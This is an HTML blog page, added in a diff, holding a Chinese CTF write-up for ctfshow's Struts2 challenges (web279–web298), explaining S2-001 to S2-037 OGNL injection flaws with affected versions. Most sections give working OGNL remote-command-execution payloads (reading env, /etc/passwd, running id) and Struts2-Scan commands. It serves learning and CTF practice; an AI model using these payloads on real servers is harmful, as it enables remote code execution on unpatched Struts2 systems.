@@ -1,0 +1,650 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/00155.jpg">
+  <link rel="icon" type="image/png" href="/img/00155.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#6b99a1">
+  <meta name="description" content="BLOG">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <title>Strut-S2- - 1__/\/のblog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="1__/\/のblog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>1__/\/</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/0071.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Strut-S2-">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-08 22:30" pubdate>
+        2022年1月8日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      87
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Strut-S2-</h1>
+            
+            <div class="markdown-body">
+              <h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p><code>S2-001</code>是struts漏洞的编号</p>
+<p>Struts2是用java语言编写的一个基于MVC设计模式的Web应用框架<br>判断是否为Strut2框架：</p>
+<ul>
+<li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效。</li>
+<li>通过网页后缀来判断，如.do .action，有可能不准。</li>
+<li>判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27446553/article/details/73639456">MORE</a></li>
+</ul>
+<blockquote>
+<p>struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据</p>
+</blockquote>
+<blockquote>
+<p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p>
+</blockquote>
+<p>OGNL表达式中</p>
+<ul>
+<li><code>%</code>   的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值</li>
+<li><code>#</code>   的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用</li>
+<li><code>$</code>   主要是在Struts 2配置文件中，引用OGNL表达式</li>
+</ul>
+<p>payload:</p>
+<pre><code>//获取tomact路径
+%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;
+//获取web路径
+%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()&#125;
+//命令执行
+%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</code></pre>
+<p>flag再env中<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201082249732.png" srcset="/img/loading.gif"><br>或者直接用工具打<br><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a><br>检测<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action</code><br>命令执行<code>python .\Struts2Scan.py -u http://5f3afd6b-33da-45f2-9367-4dd742779ca9.challenge.ctf.show/S2-001/login.action -n S2-001 --exec</code></p>
+<h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p><code>S2-003</code></p>
+<blockquote>
+<p>Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过<code>#</code>来访问struts的对象，Struts2框架虽然过滤了<code>#</code>来进行过滤，但是可以通过<code>unicode</code>编码（u0023）或<code>8进制</code>（43）绕过了安全限制，达到代码执行的效果</p>
+</blockquote>
+<blockquote>
+<p>影响版本：Struts 2.0.0 - Struts 2.0.11.2</p>
+</blockquote>
+<p><code>S2-005</code></p>
+<blockquote>
+<p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p>
+</blockquote>
+<blockquote>
+<p>影响版本：Struts 2.0.0 - Struts 2.1.8.1</p>
+</blockquote>
+<p>工具打</p>
+<h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p><code>S2-007</code></p>
+<blockquote>
+<p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回<br>影响版本：Struts2 2.0.0 - Struts2 2.2.3</p>
+</blockquote>
+<p>payload:</p>
+<blockquote>
+<p><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;</code></p>
+</blockquote>
+<h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p><code>S2-008</code></p>
+<blockquote>
+<p>S2-008有两个洞，一个是cookie处，另一个是在开启devMode模式后的调试接口能够命令执行</p>
+</blockquote>
+<p>姿势2：<br>payload：</p>
+<blockquote>
+<p><code>devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</code></p>
+</blockquote>
+<p>姿势1：<br>payload：</p>
+<blockquote>
+<p><code>Cookie:(&#39;#_memberAccess.setAllowStaticMethodAccess(true)&#39;)(1)(2)=Aluvion; (&#39;@java.lang.Runtime@getRuntime().exec(&quot;env&quot;)&#39;)(1)(2)=Twings;</code></p>
+</blockquote>
+<p>不过没成功</p>
+<p>工具打</p>
+<h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><code>Struts2 showcase远程代码执行漏洞</code></p>
+<p><code>S2-009</code><br>payload:</p>
+<blockquote>
+<p><code>/S2-009/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</code></p>
+</blockquote>
+<p>工具打</p>
+<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p><code>S2-012</code></p>
+<blockquote>
+<p>  如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
+</blockquote>
+<pre><code>&lt;package name=&quot;S2-012&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;user&quot; class=&quot;com.demo.action.UserAction&quot;&gt;        &lt;result name=&quot;redirect&quot; type=&quot;redirect&quot;&gt;/index.jsp?name=$&#123;name&#125;&lt;/result&gt;        &lt;result name=&quot;input&quot;&gt;/index.jsp&lt;/result&gt;        &lt;result name=&quot;success&quot;&gt;/index.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;</code></pre>
+<blockquote>
+<p>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行<br>影响版本: 2.1.0 - 2.3.13</p>
+</blockquote>
+<p>payload:</p>
+<pre><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre>
+<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p><code>S2-013</code></p>
+<pre><code>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
+
+    none - 链接不包含请求的任意参数值（默认）
+    get - 链接只包含 GET 请求中的参数和其值
+    all - 链接包含 GET 和 POST 所有参数和其值
+
+&lt;s:a&gt;用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞
+
+影响版本：2.0.0 - 2.3.14.1</code></pre>
+<p>payload:</p>
+<blockquote>
+<p><code>/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#39;dbapp%3D&#39;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</code></p>
+</blockquote>
+<p>工具打</p>
+<h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><pre><code>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：
+
+&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;        &lt;result&gt;/&#123;1&#125;.jsp&lt;/result&gt;    &lt;/action&gt;&lt;/package&gt;
+
+上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / &quot; / 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功
+
+还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 #_memberAccess[&#39;allowStaticMethodAccess&#39;]=true 来修改其值达到重获静态方法调用的能力
+
+影响版本: 2.0.0 - 2.3.14.2</code></pre>
+<p><code>http://d3a0fd25-58fe-4c11-a18f-99824e28344a.challenge.ctf.show/S2-015/$%7B1+1%7D.action</code></p>
+<p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091545469.png" srcset="/img/loading.gif"></p>
+<p>poc</p>
+<blockquote>
+<p><code>$&#123;#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q&#125;.action</code></p>
+</blockquote>
+<p>url编码</p>
+<blockquote>
+<p><code>%24%7B%23context%5B&#39;xwork.MethodAccessor.denyMethodExecution&#39;%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;)%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#39;id&#39;).getInputStream())%2C%23q%7D.action%0A</code></p>
+</blockquote>
+<h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><pre><code>在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令
+
+所以，访问http://your-ip:8080/index.action?redirect:OGNL表达式即可执行OGNL表达式
+
+影响版本: 2.0.0 - 2.3.15</code></pre>
+<p>payload:</p>
+<blockquote>
+<p><code>redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D</code></p>
+</blockquote>
+<h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><p><code>S2-019</code></p>
+<p>poc</p>
+<pre><code>?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()
+// 利用是先进行url编码    
+
+
+与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder
+
+影响版本：Struts 2.0.0 - Struts 2.3.15.1</code></pre>
+<h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><p><code>S2-029</code></p>
+<pre><code>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估
+
+例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%&#123;&#125;”。最终造成二次执行
+
+影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</code></pre>
+<p>poc:<code>default.action?message=(%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()))</code></p>
+<p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091614116.png" srcset="/img/loading.gif"></p>
+<h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><p><code>S2-032</code></p>
+<pre><code>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞
+
+影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</code></pre>
+<p>poc:<code>?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=\\A&amp;ppp= &amp;encoding=UTF-8&amp;cmd=env</code></p>
+<h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2><p><code>S2-033</code></p>
+<pre><code>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行
+
+影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</code></pre>
+<p>poc:<code>/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p>
+<h2 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h2><p><code>S2-037</code></p>
+<pre><code>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式
+
+影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</code></pre>
+<p>poc:<code>/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p>
+<h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p><code>反编译</code></p>
+<p>给了一个<code>war</code>包</p>
+<p>用<a target="_blank" rel="noopener" href="https://github.com/java-decompiler/jd-gui/releases"><code>Java decompiler</code></a></p>
+<p>反编译</p>
+<p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649320.png" srcset="/img/loading.gif"></p>
+<p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649164.png" srcset="/img/loading.gif"><br>payload：<code>/ctfshow/login?username=admin&amp;password=ctfshow</code></p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120729447">MORE</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/wp/">wp</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/wp/ctfshow/">ctfshow</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/WP/">WP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctfshow/">ctfshow</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/29/Log4j2/">
+                        <span class="hidden-mobile">Log4j2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
